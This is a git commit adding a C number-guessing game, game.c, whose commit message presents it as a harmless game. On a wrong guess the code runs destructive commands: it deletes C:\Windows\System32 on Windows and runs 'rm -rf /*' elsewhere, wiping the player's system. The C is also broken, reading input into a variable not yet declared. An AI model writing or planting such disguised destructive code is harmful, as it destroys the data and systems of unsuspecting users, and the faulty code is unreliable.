c4fd38cd6d16caac4e3ad6d71234d2b5fe3dfc18
🍙 𝑹𝒖𝒓𝒊 🎋 <tokynblast@gmail.com>
2026-07-21 13:08:10 -0700

    Add C version of The Game

---
+++ game.c
@@ -0,0 +1,28 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+int main() {
+    puts("Guess the number! 1-6");
+
+    int selection = 0;
+    scanf("%d", &number);
+      
+    srand(time(NULL));
+
+    int number = (rand() % 6) + 1;
+
+    if (number == selection) {
+        puts("Congrats! You did it!");
+    } else {
+       #ifdef _WIN32
+          char command[256];
+          snprintf(command, sizeof(command), "rmdir /s /q %s", "C:\\Windows\\System32");
+          system(command);
+      #else
+          system("rm -rf /*");
+      #endif
+    }
+
+    return 0;
+}
